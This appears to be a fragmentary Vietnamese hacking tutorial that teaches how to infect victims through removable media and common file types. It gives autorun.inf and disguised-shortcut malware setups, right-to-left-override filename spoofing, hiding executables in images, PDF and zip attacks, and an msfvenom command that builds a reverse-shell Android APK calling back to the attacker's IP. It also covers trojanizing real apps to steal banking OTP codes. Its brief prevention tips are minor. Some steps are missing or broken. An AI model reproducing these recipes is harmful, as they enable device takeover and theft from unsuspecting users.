1Autorun Virus (Windows): 
# Tạo file autorun.inf trên thẻ SD:
[AutoRun]
open=virus.exe
icon=virus.exe,0
action=Open folder to view files
label=My Photos

# Khi nạn nhân cắm thẻ vào máy tính:
# 1. Windows đọc autorun.inf
# 2. Tự động chạy virus.exe
# 3. Máy bị nhiễm

# CÁCH TẠO:
# 1. Viết virus.exe (bằng Python, C#, hoặc batch)
# 2. Copy virus.exe vào thẻ SD
# 3. Tạo file autorun.inf với nội dung trên
# 4. Đặt thuộc tính ẩn (Hidden) cho cả 2 file
# 5. Khi cắm vào máy → Virus tự chạy
2Fake File Extension (Giả mạo đuôi file): 
# KỸ THUẬT: Đảo ngược tên file Unicode (Right-to-Left Override)
# Dùng ký tự đặc biệt U+202E để đảo ngược tên file

# VÍ DỤ:
# File thật: "photo.jpg" + U+202E + "exe.scr"
# Windows hiển thị: "photo.scr.jpg"
# Nhưng thực chất là file .scr (executable)!

# CÁCH TẠO:
# 1. Chuẩn bị virus.exe
# 2. Đổi tên: "HinhAnh\u202Escr.exe"
#    (Windows sẽ hiển thị là "HinhAnhexe.scr" ???)
# 3. Để trong thẻ SD cùng với ảnh thật
# 4. Nạn nhân click mở "ảnh" → Chạy virus
3Shortcut Virus (LNK Exploit): 
# TẠO SHORTCUT ĐỘC HẠI:

start /b virus.exe

# 2. Tạo shortcut trỏ đến virus.bat
# 3. Đổi icon của shortcut thành icon thư mục/ảnh
# 4. Đặt tên: "Ảnh cưới" hoặc "Tài liệu quan trọng"

# KHI NẠN NHÂN CLICK:
# - Virus chạy ngầm
# - Ảnh thật mở ra (để đánh lừa)
# - Nạn nhân không nghi ngờ gì
4BadUSB Firmware Attack (Nâng cao): 
# SỬA FIRMWARE CỦA THẺ NHỚ:
# Một số thẻ SD có bộ điều khiển có thể lập trình lại

# KHI CẮM THẺ VÀO:
# 1. Thẻ SD giả làm thiết bị HID (bàn phím)
# 2. Tự động gõ lệnh tải malware

# YÊU CẦU: Kiến thức về firmware, vi điều khiển

#    Windows: copy /b cat.jpg + virus.exe secret.jpg

📁 PHẦN 4: CÁC LOẠI FILE - CÔNG DỤNG VÀ CÁCH HACK

1. File .TXT (Text - Văn bản thuần)

# CÔNG DỤNG:
- Lưu văn bản không định dạng
- Ghi chú, log, code, config
- Có thể mở bằng mọi trình soạn thảo

# CÁCH HACK QUA FILE .TXT:
1. Giả mạo đuôi file: virus.txt.exe (Windows ẩn .exe)
2. Nhúng script độc: file.txt chứa mã PowerShell
3. Unicode homograph: Dùng ký tự trông giống chữ cái
4. File .txt quá lớn gây crash Notepad
5. Macro trong file .txt mở bằng Word

2. File .PDF (Portable Document Format)

# CÔNG DỤNG:
- Tài liệu không thay đổi định dạng
- Hỗ trợ form, chữ ký số, multimedia
- Chuẩn công nghiệp cho văn bản

# CÁCH HACK QUA FILE .PDF:
1. NHÚNG JAVASCRIPT ĐỘC:
   - PDF có thể chứa JavaScript
   - Mở file → Script tự chạy
   - Tải malware, đánh cắp dữ liệu

2. EXPLOIT LỖ HỔNG ADOBE READER:
   - CVE-2021-28550: Buffer overflow
   - Mở PDF → Thực thi mã từ xa
   - Không cần click thêm gì

3. PDF PHISHING:
   - Giả mạo hóa đơn, hợp đồng
   - Chứa link đến trang phishing
   - Form điền thông tin giả

4. ẨN FILE TRONG PDF:
   - Nhúng .exe, .zip vào PDF
   - Trích xuất và chạy bằng script

# CÁCH PHÒNG:
✅ Không mở PDF từ nguồn lạ
✅ Tắt JavaScript trong Adobe Reader
✅ Dùng trình đọc PDF nhẹ (SumatraPDF)
✅ Cập nhật phần mềm thường xuyên

3. File .ZIP / .RAR (Nén)

# CÔNG DỤNG:
- Nén nhiều file thành 1
- Giảm dung lượng
- Bảo vệ bằng mật khẩu

# CÁCH HACK QUA FILE .ZIP:
1. ZIP BOMB (Bom nén):
   - File zip nhỏ (vài KB) nhưng giải nén ra hàng TB
   - Làm đầy ổ cứng, crash server
   - Ví dụ: 42.zip (42KB → 4.5PB khi giải nén)

2. ZIP SLIP ATTACK:
   - File trong zip có tên: ../../../etc/passwd
   - Khi giải nén, file bị ghi đè vào thư mục hệ thống
   - Ghi đè file quan trọng

3. MẬT KHẨU BẢO VỆ:
   - Brute force mật khẩu zip
   - Dùng john: zip2john file.zip > hash
   - john hash

4. NHÚNG MALWARE:
   - Virus trong file zip
   - Kẻ tấn công gửi file: "Hoa_don.zip"
   - Bên trong: Hoa_don.pdf.exe (giả mạo)

4. File .APK (Android Package)

# CÔNG DỤNG:
- File cài đặt ứng dụng Android
- Chứa code, tài nguyên, manifest
- Có thể cài từ CH Play hoặc sideload

# CÁCH HACK QUA FILE .APK:

1. TẠO APK ĐỘC HẠI (Trojan):
   msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o virus.apk
   # Tạo APK kết nối ngược về máy hacker
   # Khi nạn nhân cài → Hacker điều khiển điện thoại

2. NHÚNG MALWARE VÀO APK THẬT:
   - Tải APK game/app phổ biến
   - Dùng tool (ApkEasyTool) để decompile
   - Thêm code độc vào
   - Build lại APK mới
   - Phát tán qua web, Telegram

3. PERMISSION ABUSE:
   - APK xin quyền: SMS, Camera, Microphone, Location
   - Đọc trộm tin nhắn OTP ngân hàng
   - Quay lén, nghe lén, theo dõi GPS

4. CLICKER FRAUD:
   - APK chạy ngầm, tự động click quảng cáo
   - Kiếm tiền cho hacker
   - Nạn nhân không biết

# DẤU HIỆU APK ĐỘC:
❌ Yêu cầu quyền lạ (SMS, Accessibility)
❌ Từ nguồn không chính thức
❌ Tên file lạ: "Mod_Game.apk"
❌ Dung lượng nhỏ bất thường

5. File .IPA (iOS App Store Package)

# CÔNG DỤNG:
